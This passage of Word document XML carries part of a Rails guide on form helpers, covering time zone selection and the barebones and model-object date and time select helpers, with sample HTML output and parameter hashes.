        <w:t xml:space="preserve"> helper that already wraps this:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="5280"/>
      </w:tblGrid>
      <w:tr w:rsidR="006E53E9" w:rsidRPr="006E53E9" w14:paraId="5BCF546D" w14:textId="77777777" w:rsidTr="006E53E9">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="3971BF94" w14:textId="77777777" w:rsidR="006E53E9" w:rsidRPr="006E53E9" w:rsidRDefault="006E53E9" w:rsidP="006E53E9">
            <w:pPr>
              <w:widowControl/>
              <w:jc w:val="left"/>
              <w:divId w:val="1786998606"/>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time_zone_select(:person, :time_zone) %&gt;</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="3BE6B44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There is also </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>time_zone_options_for_select</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> helper for a more manual (therefore more customizable) way of doing this. Read the API documentation to learn about the possible arguments for these two methods.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1C9E3FF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w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:i/>
          <w:iCs/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>used</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> to have a </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>country_select</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> helper for choosing countries, but this has been extracted to the </w:t>
      </w:r>
      <w:hyperlink r:id="rId307" w:history="1">
        <w:r w:rsidRPr="006E53E9">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>country_select plugin</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>. When using this, be aware that the exclusion or inclusion of certain names from the list can be somewhat controversial (and was the reason this functionality was extracted from Rails).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7E07AC9B"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4 Using Date and Time Form Helpers</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0775AF0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You can choose not to use the form helpers generating HTML5 date input fields and use the alternative date and time helpers. These date and time helpers differ from all the other form helpers in two important respects:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="48C81E45" w14:textId="77777777" w:rsidR="006E53E9" w:rsidRPr="006E53E9" w:rsidRDefault="006E53E9" w:rsidP="006E53E9">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="87"/>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Dates and times are not representable by a single input element. Instead you have several, one for each component (year, month, day etc.) and so there is no single value in your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hash with your date or time.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="403E1389" w14:textId="77777777" w:rsidR="006E53E9" w:rsidRPr="006E53E9" w:rsidRDefault="006E53E9" w:rsidP="006E53E9">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="87"/>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Other helpers use the </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>_tag</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> suffix to indicate whether a helper is a barebones helper or one that operates on model objects. With dates and times, </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>select_date</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>select_time</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> and </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>select_datetime</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> are the barebones helpers, </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>date_select</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>time_select</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> and </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>datetime_select</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> are the equivalent model object helpers.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="288039C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Both of these families of helpers will create a series of select boxes for the different components (year, month, day etc.).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5A3533F3"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4.1 Barebones Helpers</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4616D50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w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>select_*</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> family of helpers take as their first argument an instance of Date, Time or DateTime that is used as the currently selected value. You may omit this parameter, in which case the current date is used. For example</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="6360"/>
      </w:tblGrid>
      <w:tr w:rsidR="006E53E9" w:rsidRPr="006E53E9" w14:paraId="2F5FC6FF" w14:textId="77777777" w:rsidTr="006E53E9">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="74F67E7F" w14:textId="77777777" w:rsidR="006E53E9" w:rsidRPr="006E53E9" w:rsidRDefault="006E53E9" w:rsidP="006E53E9">
            <w:pPr>
              <w:widowControl/>
              <w:jc w:val="left"/>
              <w:divId w:val="501048709"/>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select_date Date.today, :prefix</w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>=&gt; :start_date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0861FE0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outputs (with actual option values omitted for brevity)</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="8280"/>
      </w:tblGrid>
      <w:tr w:rsidR="006E53E9" w:rsidRPr="006E53E9" w14:paraId="3A331A3C" w14:textId="77777777" w:rsidTr="006E53E9">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="325B20C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&lt;select</w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>id="start_date_year"</w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>name="start_date[year]"&gt; ... &lt;/select&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6D04F15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&lt;select</w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>id="start_date_month"</w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>name="start_date[month]"&gt; ... &lt;/select&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="71AAA2C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&lt;select</w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>id="start_date_day"</w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>name="start_date[day]"&gt; ... &lt;/select&gt;</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="5582525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above inputs would result in </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>params[:start_date]</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> being a hash with keys </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>:year</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>:month</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>:day</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>. To get an actual Time or Date object you would have to extract these values and pass them to the appropriate constructor, for example</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4102B02C" w14:textId="77777777" w:rsidTr="006E53E9">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="039D34E4" w14:textId="77777777" w:rsidR="006E53E9" w:rsidRPr="006E53E9" w:rsidRDefault="006E53E9" w:rsidP="006E53E9">
            <w:pPr>
              <w:widowControl/>
              <w:jc w:val="left"/>
              <w:divId w:val="1919167927"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>Date.civil(params[:start_date][:year].to_i, params[:start_date][:month].to_i, params[:start_date][:day].to_i)</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="1F2D5B4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w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>:prefix</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> option is the key used to retrieve the hash of date components from the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hash. Here it was set to </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>start_date</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">, if omitted it will default to </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>date</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2A149894"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4.2 Model Object Helpers</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="732E260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select_date</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> does not work well with forms that update or create Active Record objects as Active Record expects each element of the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hash to correspond to one attribute. The model object helpers for dates and times submit parameters with special names, when Active Record sees parameters with such names it knows they must be combined with the other parameters and given to a constructor appropriate to the column type. For example:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="4680"/>
      </w:tblGrid>
      <w:tr w:rsidR="006E53E9" w:rsidRPr="006E53E9" w14:paraId="01F3DFF0" w14:textId="77777777" w:rsidTr="006E53E9">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="4C76BB15" w14:textId="77777777" w:rsidR="006E53E9" w:rsidRPr="006E53E9" w:rsidRDefault="006E53E9" w:rsidP="006E53E9">
            <w:pPr>
              <w:widowControl/>
              <w:jc w:val="left"/>
              <w:divId w:val="913931477"/>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date_select :person, :birth_date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03E29C5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outputs (with actual option values omitted for brevity)</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3009B16E" w14:textId="77777777" w:rsidTr="006E53E9">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="2795224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&lt;select</w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>id="person_birth_date_1i"</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name="person[birth_date(1i)]"&gt; ... &lt;/select&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1F51F39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&lt;select</w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>id="person_birth_date_2i"</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name="person[birth_date(2i)]"&gt; ... &lt;/select&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="25FB2D6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&lt;select</w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>id="person_birth_date_3i"</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name="person[birth_date(3i)]"&gt; ... &lt;/select&gt;</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="7EE8A57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which results in a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hash like</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7D6467FC" w14:textId="77777777" w:rsidTr="006E53E9">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="3E206F8E" w14:textId="77777777" w:rsidR="006E53E9" w:rsidRPr="006E53E9" w:rsidRDefault="006E53E9" w:rsidP="006E53E9">
            <w:pPr>
